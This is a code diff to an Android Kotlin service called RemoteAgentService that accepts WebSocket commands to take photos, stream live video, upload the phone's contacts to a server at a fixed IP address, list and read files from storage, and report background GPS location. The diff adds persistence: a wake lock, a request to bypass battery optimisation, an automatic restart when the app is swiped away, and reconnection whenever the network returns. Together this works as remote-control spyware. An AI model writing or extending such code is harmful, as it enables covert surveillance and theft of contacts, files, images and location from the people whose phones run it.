@@ -41,6 +41,15 @@ import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import okio.ByteString
 import android.Manifest
+import android.app.AlarmManager
+import android.app.PendingIntent
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
+import android.net.Uri
+import android.os.PowerManager
+import android.provider.Settings
 import android.util.Base64
 
 import androidx.core.app.ActivityCompat
@@ -54,6 +63,7 @@ import com.google.android.gms.location.Priority
 class RemoteAgentService : Service() {
 
     private lateinit var server: NanoHTTPD
+    private lateinit var wakeLock: PowerManager.WakeLock
 
     private var wsClient: WebSocketClient? = null
     private val deviceId = "android-device-001" // give a unique ID per device
@@ -62,9 +72,29 @@ class RemoteAgentService : Service() {
     override fun onCreate() {
         super.onCreate()
         startForeground(1, createNotification())
+
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RemoteAgent::WakeLock")
+        wakeLock.acquire(10*60*1000L /*10 minutes*/)
+
+        fun ignoreBatteryOptimizations() {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            val packageName = packageName
+
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                intent.data = Uri.parse("package:$packageName")
+                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                startActivity(intent)
+            }
+        }
+
+        ignoreBatteryOptimizations()
         startServer()
+        registerNetworkCallback()
         connectWebSocket()
         startLocationUpdates()
+
     }
 
     private var reconnecting = false
@@ -82,25 +112,25 @@ class RemoteAgentService : Service() {
                     println("✅ Connected to WebSocket server")
                     reconnecting = false
 
-                    val registerMsg = """{"type":"hello","deviceId":"$deviceId"}"""
-                    send(registerMsg)
+                    // 📌 Safe register message
+                    safeSend("""{"type":"hello","deviceId":"$deviceId"}""")
 
                     // 🔹 Start ping keepalive
                     startPingTimer()
-
                 }
-
 
                 override fun onMessage(message: String?) {
                     if (message == null) return
                     try {
                         val json = JSONObject(message)
                         when (json.optString("type")) {
+
                             "capture" -> handleCapture(json.optString("which"))
                             "video" -> handleVideo(json.optString("which"))
                             "contacts" -> handleContactsUpload()
                             "files" -> handleFileUpload()
                             "location" -> handleLocation()
+
                             "file_list" -> {
                                 val path = json.optString("path", "")
                                 handleFileListWS(path)
@@ -110,8 +140,9 @@ class RemoteAgentService : Service() {
                                 val path = json.optString("path", "")
                                 handleFileReadWS(path)
                             }
-                            "ping" -> wsClient?.send("{\"type\":\"pong\",\"deviceId\":\"$deviceId\"}")
-//                            "stop_video" -> stopCamera() // optional stop command
+
+                            // 📌 Protected ping
+                            "ping" -> safeSend("""{"type":"pong","deviceId":"$deviceId"}""")
                         }
                     } catch (e: Exception) {
                         println("⚠️ Error parsing message: ${e.message}")
@@ -129,41 +160,99 @@ class RemoteAgentService : Service() {
                     stopStreaming()
                     scheduleReconnect()
                 }
-
             }
 
             wsClient?.connect()
+
         } catch (e: Exception) {
             e.printStackTrace()
             scheduleReconnect()
         }
     }
 
+
     private fun startPingTimer() {
         val handler = Handler(Looper.getMainLooper())
+
         val runnable = object : Runnable {
             override fun run() {
                 try {
-                    wsClient?.send("{\"type\":\"ping\",\"deviceId\":\"$deviceId\"}")
-                    handler.postDelayed(this, 10000) // every 10s
+                    val ws = wsClient
+
+                    // 🛑 WS not connected → skip ping safely
+                    if (ws == null || !ws.isOpen) {
+                        println("⚠️ Ping skipped, WS not connected")
+                        handler.postDelayed(this, 10000)
+                        return
+                    }
+
+                    // ✅ Safe WS send
+                    safeSend("""{"type":"ping","deviceId":"$deviceId"}""")
+                    println("ping pong")
                 } catch (e: Exception) {
                     println("⚠️ Ping failed: ${e.message}")
                 }
+
+                // Schedule next ping
+                handler.postDelayed(this, 10000)
             }
         }
+
         handler.postDelayed(runnable, 10000)
     }
+
+    private fun safeSend(msg: String) {
+        try {
+            if (wsClient != null && wsClient!!.isOpen) {
+                wsClient!!.send(msg)
+            } else {
+                println("⚠️ WS not connected, message dropped: $msg")
+            }
+        } catch (e: Exception) {
+            println("❌ WS send failed: ${e.message}")
+        }
+    }
+
+
+
+
+//    private fun scheduleReconnect() {
+//        if (reconnecting) return
+//        reconnecting = true
+//        println("🔁 Reconnecting WebSocket in 3s…")
+//
+//        Handler(Looper.getMainLooper()).postDelayed({
+//            reconnecting = false // ✅ allow next attempt
+//            connectWebSocket()
+//        }, 3000)
+//    }
+
+    private fun safeWsSend(msg: String) {
+        try {
+            val ws = wsClient
+            if (ws != null && ws.isOpen) {
+                ws.send(msg)
+            } else {
+                println("⚠️ WS not connected — skipping send: $msg")
+            }
+        } catch (e: Exception) {
+            println("❌ WS send failed: ${e.message}")
+        }
+    }
+
 
     private fun scheduleReconnect() {
         if (reconnecting) return
         reconnecting = true
         println("🔁 Reconnecting WebSocket in 3s…")
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            reconnecting = false // ✅ allow next attempt
+        Thread {
+            Thread.sleep(3000)
+            reconnecting = false
             connectWebSocket()
-        }, 3000)
+        }.start()
     }
+
 
     private fun stopStreaming() {
         if (isStreaming) {
@@ -208,21 +297,31 @@ class RemoteAgentService : Service() {
 
         val callback = object : LocationCallback() {
             override fun onLocationResult(result: LocationResult) {
-                val loc = result.lastLocation ?: return
+                try {
+                    val loc = result.lastLocation ?: return
 
-                val json = """
-                {
-                  "type": "location",
-                  "deviceId": "$deviceId",
-                  "lat": ${loc.latitude},
-                  "lng": ${loc.longitude},
-                  "accuracy": ${loc.accuracy}
-                }
-            """.trimIndent()
-
-                wsClient?.send(json)
-                println("📍 Background Location: $json")
+                    val json = """
+            {
+              "type": "location",
+              "deviceId": "$deviceId",
+              "lat": ${loc.latitude},
+              "lng": ${loc.longitude},
+              "accuracy": ${loc.accuracy}
             }
+        """.trimIndent()
+
+                    if (wsClient != null && wsClient!!.isOpen) {
+                        wsClient!!.send(json)
+                    } else {
+                        println("⚠️ WebSocket not connected — skipping location send")
+                    }
+
+                    println("📍 Background Location: $json")
+                } catch (e: Exception) {
+                    println("❌ LOCATION CALLBACK CRASH PREVENTED: ${e.message}")
+                }
+            }
+
         }
 
         if (ActivityCompat.checkSelfPermission(
@@ -329,7 +428,17 @@ class RemoteAgentService : Service() {
                     }
                 } catch (ex: Exception) {
                     ex.printStackTrace()
-                    wsClient?.send("{\"status\":\"upload_failed\",\"error\":\"${ex.message}\"}")
+                    try {
+                        val ws = wsClient
+                        if (ws != null && ws.isOpen) {
+                            ws.send("{\"status\":\"upload_failed\",\"error\":\"${ex.message}\"}")
+                        } else {
+                            println("⚠️ Cannot report upload_failed — WS not connected")
+                        }
+                    } catch (e2: Exception) {
+                        println("❌ Failed to send upload_failed WS message: ${e2.message}")
+                    }
+
                 }
             }
         }.start()
@@ -361,6 +470,7 @@ class RemoteAgentService : Service() {
 
     private fun handleContactsUpload() {
         val contactsJson = getContactsJson()
+
         Thread {
             try {
                 val url = URL("http://192.168.31.50:3003/contacts")
@@ -369,13 +479,18 @@ class RemoteAgentService : Service() {
                     doOutput = true
                     setRequestProperty("Content-Type", "application/json")
                 }
+
                 val jsonBody = """{"deviceId":"$deviceId","contacts":$contactsJson}"""
                 conn.outputStream.use { it.write(jsonBody.toByteArray()) }
-                println("📤 Contacts uploaded: ${conn.responseCode}")
-                wsClient?.send("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
+
+                val code = conn.responseCode
+                println("📤 Contacts uploaded: $code")
+
+                safeWsSend("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
+
             } catch (ex: Exception) {
                 ex.printStackTrace()
-                wsClient?.send("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
+                safeWsSend("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
             }
         }.start()
     }
@@ -410,9 +525,19 @@ class RemoteAgentService : Service() {
 //    ---WS file handle
 
     private fun sendWS(data: Map<String, Any?>) {
-        val json = JSONObject(data).toString()
-        wsClient?.send(json)
+        try {
+            val ws = wsClient
+            if (ws != null && ws.isOpen) {
+                val json = JSONObject(data).toString()
+                ws.send(json)
+            } else {
+                println("⚠️ WS not connected — skipping WS send: $data")
+            }
+        } catch (e: Exception) {
+            println("❌ WS send failed: ${e.message}")
+        }
     }
+
 
 
     private fun handleFileListWS(path: String) {
@@ -447,6 +572,7 @@ class RemoteAgentService : Service() {
         )
     }
 
+
     private fun handleFileReadWS(path: String) {
         val baseDir = Environment.getExternalStorageDirectory()
         val target = File(baseDir, path)
@@ -462,25 +588,28 @@ class RemoteAgentService : Service() {
             return
         }
 
-        val bytes = target.readBytes()
-        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+        try {
+            val bytes = target.readBytes()
+            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
 
-        sendWS(
-            mapOf(
-                "type" to "file_read_result",
-                "path" to path,
-                "data" to base64
+            sendWS(
+                mapOf(
+                    "type" to "file_read_result",
+                    "path" to path,
+                    "data" to base64
+                )
             )
-        )
+        } catch (e: Exception) {
+            println("❌ File read failed: ${e.message}")
+            sendWS(
+                mapOf(
+                    "type" to "file_read_result",
+                    "path" to path,
+                    "error" to e.message
+                )
+            )
+        }
     }
-
-
-
-
-
-
-
-
 
 
 
@@ -496,17 +625,58 @@ class RemoteAgentService : Service() {
         return START_STICKY
     }
 
+    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
+        override fun onAvailable(network: Network) {
+            connectWebSocket()
+        }
+    }
+
+    private fun registerNetworkCallback() {
+        val connectivityManager =
+            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+
+        val request = NetworkRequest.Builder()
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            .build()
+
+        connectivityManager.registerNetworkCallback(
+            request,
+            object : ConnectivityManager.NetworkCallback() {
+
+                override fun onAvailable(network: Network) {
+                    println("✅ Network available — reconnecting WebSocket")
+                    connectWebSocket()  // ONLY connect when network returns
+                }
+
+                override fun onLost(network: Network) {
+                    println("❌ Network lost — stopping WebSocket")
+                    try {
+                        wsClient?.close()
+                    } catch (_: Exception) {}
+                }
+            }
+        )
+    }
+
+
+
     // ✅ Add this method
     override fun onTaskRemoved(rootIntent: Intent?) {
-        // Restart service if app is swiped away
-        val restartServiceIntent = Intent(applicationContext, RemoteAgentService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(restartServiceIntent)
-        } else {
-            startService(restartServiceIntent)
-        }
         super.onTaskRemoved(rootIntent)
+
+        println("🛑 App removed from recent — restarting service")
+
+        val restartIntent = Intent(applicationContext, RemoteAgentService::class.java)
+        restartIntent.putExtra("from_restart", true)
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(restartIntent)
+        } else {
+            startService(restartIntent)
+        }
     }
+
+
 
     private fun startServer() {
         server = object : NanoHTTPD(8080) {
@@ -600,18 +770,30 @@ class RemoteAgentService : Service() {
 
                     camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                         override fun onConfigured(session: CameraCaptureSession) {
-                            reader.setOnImageAvailableListener({ reader ->
-                                val image = reader.acquireLatestImage()
-                                val buffer = image.planes[0].buffer
-                                val bytes = ByteArray(buffer.remaining())
-                                buffer.get(bytes)
-                                image.close()
-                                imageBytes = bytes
-                                session.close()
-                                camera.close()
-                                handlerThread.quitSafely()
-                                resultLatch.countDown()
+                            reader.setOnImageAvailableListener({ r ->
+                                try {
+                                    val image = r.acquireLatestImage() ?: run {
+                                        println("⚠️ No image available")
+                                        resultLatch.countDown()
+                                        return@setOnImageAvailableListener
+                                    }
+
+                                    val buffer = image.planes[0].buffer
+                                    val bytes = ByteArray(buffer.remaining())
+                                    buffer.get(bytes)
+                                    image.close()
+
+                                    imageBytes = bytes
+                                } catch (e: Exception) {
+                                    println("❌ Failed to read captured frame: ${e.message}")
+                                } finally {
+                                    try { session.close() } catch (_: Exception) {}
+                                    try { camera.close() } catch (_: Exception) {}
+                                    handlerThread.quitSafely()
+                                    resultLatch.countDown()
+                                }
                             }, handler)
+
                             session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                         }
 
@@ -804,7 +986,12 @@ class RemoteAgentService : Service() {
         val ws = client.newWebSocket(request, object : WebSocketListener() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 println("📡 Connected to Node.js WS")
-                webSocket.send("""{"type":"video_stream","deviceId":"android-device-001"}""")
+                try {
+                    webSocket.send("""{"type":"video_stream","deviceId":"android-device-001"}""")
+                } catch (e: Exception) {
+                    println("❌ WS send in onOpen failed: ${e.message}")
+                }
+
             }
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
@@ -841,14 +1028,36 @@ class RemoteAgentService : Service() {
                                     activeSession = session
 
                                     reader.setOnImageAvailableListener({ r ->
-                                        val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
-                                        val buffer = img.planes[0].buffer
-                                        val bytes = ByteArray(buffer.remaining())
-                                        buffer.get(bytes)
-                                        img.close()
+
+                                        var bytes: ByteArray? = null
 
                                         try {
-                                            activeWs?.send(ByteString.of(*bytes))
+                                            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                                            val buffer = img.planes[0].buffer
+                                            bytes = ByteArray(buffer.remaining())
+                                            buffer.get(bytes)
+                                            img.close()
+                                        } catch (e: Exception) {
+                                            println("❌ Failed to read camera frame: ${e.message}")
+                                            return@setOnImageAvailableListener
+                                        }
+
+                                        // if bytes is still null → do nothing
+                                        val safeBytes = bytes ?: return@setOnImageAvailableListener
+
+                                        try {
+                                            try {
+                                                val ws = activeWs
+                                                if (ws != null && ws.send(ByteString.of(*safeBytes))) {
+                                                    // OK
+                                                } else {
+                                                    println("⚠️ WS not connected, skipping video frame")
+                                                }
+                                            } catch (e: Exception) {
+                                                println("❌ Video send failed: ${e.message}")
+                                                stopCameraStreaming()
+                                            }
+
                                         } catch (e: Exception) {
                                             println("⚠️ WS send failed: ${e.message}")
                                             stopCameraStreaming()
@@ -963,8 +1172,11 @@ class RemoteAgentService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        if (wakeLock.isHeld) wakeLock.release()
         server.stop()
     }
+
+
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
